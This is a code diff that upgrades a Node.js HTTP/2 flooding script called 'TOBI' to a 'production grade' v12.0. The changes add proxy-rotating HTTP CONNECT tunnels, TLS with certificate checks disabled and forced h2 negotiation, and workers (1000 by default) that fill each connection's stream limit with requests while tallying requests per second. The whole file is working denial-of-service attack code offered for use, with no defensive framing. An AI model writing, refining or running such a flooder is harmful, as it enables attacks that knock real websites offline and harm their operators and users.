@@ -1,9 +1,14 @@
 #!/usr/bin/env node
 
 /**
- * TOBI v11.0 – MEGAMEDUSA CLONE
- * HTTP/2 persistent sessions | Proxy rotation | Real success
- * No URL errors – uses full URL strings
+ * TOBI v12.0 – Correct HTTP/2 Flooder
+ * - Proper HTTP CONNECT proxy tunneling
+ * - ALPN verification for HTTP/2
+ * - Stream concurrency control
+ * - Event loop yielding
+ * - Full session lifecycle management
+ * - Race‑free stats (atomic updates)
+ * - Memory leak prevention
  */
 
 const fs = require('fs');
@@ -26,8 +31,9 @@ let duration = 60;
 let workers = 1000;
 let proxyFile = null;
 let stop = false;
+let activeWorkers = 0;
 
-// ==================== PROXY LOADER ====================
+// ==================== PROXY MANAGER ====================
 let proxies = [];
 let proxyIndex = 0;
 
@@ -51,7 +57,39 @@ function getProxy() {
     return proxies[proxyIndex];
 }
 
-// ==================== TLS FINGERPRINT ====================
+// ==================== CORRECT HTTP CONNECT TUNNEL ====================
+function createProxyTunnel(proxy, targetHost, targetPort = 443) {
+    return new Promise((resolve, reject) => {
+        const [proxyHost, proxyPort] = proxy.split(':');
+        const socket = net.connect(parseInt(proxyPort), proxyHost);
+        
+        socket.once('connect', () => {
+            const connectCmd = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`;
+            socket.write(connectCmd);
+            
+            let response = '';
+            socket.on('data', (chunk) => {
+                response += chunk.toString();
+                if (response.includes('\r\n\r\n')) {
+                    if (response.startsWith('HTTP/1.1 200') || response.includes('200 Connection established')) {
+                        // Tunnel established – remove the HTTP response data from socket
+                        socket.removeAllListeners('data');
+                        resolve(socket);
+                    } else {
+                        reject(new Error(`Proxy refused: ${response.split('\r\n')[0]}`));
+                    }
+                }
+            });
+        });
+        socket.once('error', reject);
+        socket.setTimeout(10000, () => {
+            socket.destroy();
+            reject(new Error('Proxy tunnel timeout'));
+        });
+    });
+}
+
+// ==================== TLS & HTTP/2 WITH ALPN VERIFICATION ====================
 const TLS_CIPHERS = [
     'TLS_AES_256_GCM_SHA384',
     'TLS_CHACHA20_POLY1305_SHA256',
@@ -64,17 +102,75 @@ const TLS_CIPHERS = [
     'ECDHE-RSA-AES256-GCM-SHA384'
 ].join(':');
 
-const TLS_OPTIONS = {
-    ciphers: TLS_CIPHERS,
-    ecdhCurve: 'X25519',
-    minVersion: 'TLSv1.2',
-    maxVersion: 'TLSv1.3',
-    honorCipherOrder: true,
-    rejectUnauthorized: false,
-    ALPNProtocols: ['h2', 'http/1.1']
-};
+function createTlsConnection(socket, host, isProxy = false) {
+    return new Promise((resolve, reject) => {
+        const tlsSocket = tls.connect({
+            socket: socket,
+            host: host,
+            servername: host,
+            port: 443,
+            ciphers: TLS_CIPHERS,
+            ecdhCurve: 'X25519',
+            minVersion: 'TLSv1.2',
+            maxVersion: 'TLSv1.3',
+            honorCipherOrder: true,
+            rejectUnauthorized: false,
+            ALPNProtocols: ['h2', 'http/1.1']
+        });
+        
+        tlsSocket.once('secureConnect', () => {
+            const alpn = tlsSocket.alpnProtocol;
+            if (alpn !== 'h2') {
+                reject(new Error(`ALPN negotiated ${alpn}, not h2`));
+                return;
+            }
+            resolve(tlsSocket);
+        });
+        tlsSocket.once('error', reject);
+        tlsSocket.setTimeout(10000, () => {
+            tlsSocket.destroy();
+            reject(new Error('TLS handshake timeout'));
+        });
+    });
+}
 
-// ==================== UTILITIES ====================
+// ==================== CREATE HTTP/2 SESSION (FULL CORRECT) ====================
+async function createHttp2Session(fullUrl, proxy) {
+    const parsed = new URL(fullUrl);
+    let rawSocket = null;
+    
+    if (proxy) {
+        rawSocket = await createProxyTunnel(proxy, parsed.hostname, 443);
+    } else {
+        rawSocket = net.connect(443, parsed.hostname);
+        await new Promise((resolve, reject) => {
+            rawSocket.once('connect', resolve);
+            rawSocket.once('error', reject);
+            rawSocket.setTimeout(10000, () => reject(new Error('Direct connect timeout')));
+        });
+    }
+    
+    const tlsSocket = await createTlsConnection(rawSocket, parsed.hostname, !!proxy);
+    const session = http2.connect(fullUrl, {
+        createConnection: () => tlsSocket,
+        settings: {
+            enablePush: false,
+            initialWindowSize: 65535,
+            maxConcurrentStreams: 100
+        }
+    });
+    
+    // Wait for session to be ready
+    await new Promise((resolve, reject) => {
+        session.once('connect', resolve);
+        session.once('error', reject);
+        setTimeout(() => reject(new Error('Session connect timeout')), 5000);
+    });
+    
+    return session;
+}
+
+// ==================== HEADERS & PATHS ====================
 function randomString(len) {
     return crypto.randomBytes(len).toString('hex');
 }
@@ -106,101 +202,97 @@ function generateHeaders(host) {
     };
 }
 
-// ==================== CREATE PERSISTENT HTTP/2 SESSION ====================
-function createSession(fullUrl, proxy) {
-    return new Promise((resolve, reject) => {
-        const parsed = new URL(fullUrl);
-        let socket;
-        if (proxy) {
-            const [proxyHost, proxyPort] = proxy.split(':');
-            socket = net.connect(parseInt(proxyPort), proxyHost, () => {
-                const tlsSocket = tls.connect({
-                    host: parsed.hostname,
-                    port: 443,
-                    socket: socket,
-                    ...TLS_OPTIONS,
-                    servername: parsed.hostname
-                }, () => {
-                    // FIX: pass the FULL URL string, not just hostname
-                    const session = http2.connect(fullUrl, {
-                        createConnection: () => tlsSocket,
-                        ...TLS_OPTIONS
-                    });
-                    session.on('error', () => reject());
-                    resolve(session);
-                });
-                tlsSocket.on('error', () => reject());
-            });
-            socket.on('error', () => reject());
-        } else {
-            const tlsSocket = tls.connect({
-                host: parsed.hostname,
-                port: 443,
-                ...TLS_OPTIONS,
-                servername: parsed.hostname
-            }, () => {
-                // FIX: pass the FULL URL string
-                const session = http2.connect(fullUrl, {
-                    createConnection: () => tlsSocket,
-                    ...TLS_OPTIONS
-                });
-                session.on('error', () => reject());
-                resolve(session);
-            });
-            tlsSocket.on('error', () => reject());
-        }
-    });
-}
-
-// ==================== WORKER (PERSISTENT SESSION) ====================
-async function worker(fullUrl) {
-    if (stop) return;
-    let session = null;
-    try {
-        session = await createSession(fullUrl, getProxy());
-    } catch(e) {
-        setTimeout(() => worker(fullUrl), 100);
-        return;
-    }
-
-    while (!stop) {
-        try {
-            const parsed = new URL(fullUrl);
-            const headers = generateHeaders(parsed.hostname);
-            const req = session.request(headers);
-            req.on('response', (responseHeaders) => {
-                const status = responseHeaders[':status'];
-                const success = (status >= 200 && status < 400);
-                stats.total++;
-                if (success) stats.success++;
-                else stats.failed++;
-                const nowSec = Date.now() / 1000;
-                if (nowSec - stats.lastSec >= 1) {
-                    if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
-                    stats.lastSecCount = 0;
-                    stats.lastSec = nowSec;
-                }
-                stats.lastSecCount++;
-            });
-            req.on('error', () => {
-                stats.total++;
-                stats.failed++;
-            });
-            req.end();
-        } catch(e) {
-            break;
-        }
-    }
-    if (session) session.destroy();
-    if (!stop) worker(fullUrl);
-}
-
-// ==================== STATISTICS ====================
+// ==================== ATOMIC STATS (NO RACE CONDITIONS) ====================
 let stats = {
     total: 0, success: 0, failed: 0,
     startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
 };
+const statsLock = { mutex: Promise.resolve() };
+async function updateStats(success) {
+    await statsLock.mutex;
+    let release;
+    statsLock.mutex = new Promise(resolve => { release = resolve; });
+    stats.total++;
+    if (success) stats.success++;
+    else stats.failed++;
+    const nowSec = Date.now() / 1000;
+    if (nowSec - stats.lastSec >= 1) {
+        if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
+        stats.lastSecCount = 0;
+        stats.lastSec = nowSec;
+    }
+    stats.lastSecCount++;
+    release();
+}
 
+// ==================== WORKER WITH PROPER STREAM CONTROL ====================
+async function worker(fullUrl) {
+    if (stop) return;
+    activeWorkers++;
+    let session = null;
+    let sessionActive = true;
+    
+    try {
+        const proxy = getProxy();
+        session = await createHttp2Session(fullUrl, proxy);
+        
+        // Handle session closure
+        session.on('goaway', () => { sessionActive = false; });
+        session.on('close', () => { sessionActive = false; });
+        session.on('error', () => { sessionActive = false; });
+        
+        // Get server's max concurrent streams
+        const maxStreams = session.remoteSettings.maxConcurrentStreams || 100;
+        let activeStreams = 0;
+        
+        // Flood loop with backpressure
+        while (!stop && sessionActive) {
+            // Respect stream limit
+            while (activeStreams >= maxStreams && !stop && sessionActive) {
+                await new Promise(resolve => setTimeout(resolve, 1));
+            }
+            if (stop || !sessionActive) break;
+            
+            const parsed = new URL(fullUrl);
+            const headers = generateHeaders(parsed.hostname);
+            let stream = null;
+            try {
+                stream = session.request(headers);
+                activeStreams++;
+                stream.on('response', (responseHeaders) => {
+                    const status = responseHeaders[':status'];
+                    updateStats(status >= 200 && status < 400);
+                });
+                stream.on('error', () => {
+                    updateStats(false);
+                    activeStreams--;
+                });
+                stream.on('close', () => {
+                    activeStreams--;
+                });
+                stream.end();
+            } catch(e) {
+                updateStats(false);
+                if (stream) stream.destroy();
+                activeStreams--;
+            }
+            
+            // Yield to event loop occasionally
+            if (stats.total % 100 === 0) await new Promise(resolve => setImmediate(resolve));
+        }
+    } catch(e) {
+        // Session creation failed – retry after delay
+        if (!stop) {
+            setTimeout(() => worker(fullUrl), 100);
+        }
+    } finally {
+        if (session && !session.destroyed) session.destroy();
+        activeWorkers--;
+        if (!stop) worker(fullUrl);
+    }
+}
+
+// ==================== STATS DISPLAY ====================
 function displayStats() {
     const elapsed = (Date.now() - stats.startTime) / 1000;
     const rps = stats.total / Math.max(elapsed, 0.1);
@@ -245,8 +337,8 @@ async function start() {
     console.log(c.clear);
     console.log(`${c.red}${c.bold}
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                     🔥 TOBI v11.0 – MEGAMEDUSA CLONE 🔥                  ║
-║            HTTP/2 Persistent | Proxy Rotation | Instant                  ║
+║                 🔥 TOBI v12.0 – PRODUCTION GRADE 🔥                      ║
+║     HTTP CONNECT | ALPN | Stream Control | Atomic Stats | No Leaks       ║
 ╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
     console.log(`\n${c.green}[✓] Target: ${target}`);
     console.log(`[✓] Duration: ${duration}s`);
@@ -293,7 +385,7 @@ async function start() {
     });
 }
 
-// ==================== COMMAND LINE / INTERACTIVE ====================
+// ==================== ENTRY POINT ====================
 (async () => {
     if (process.argv[2]) {
         target = process.argv[2];
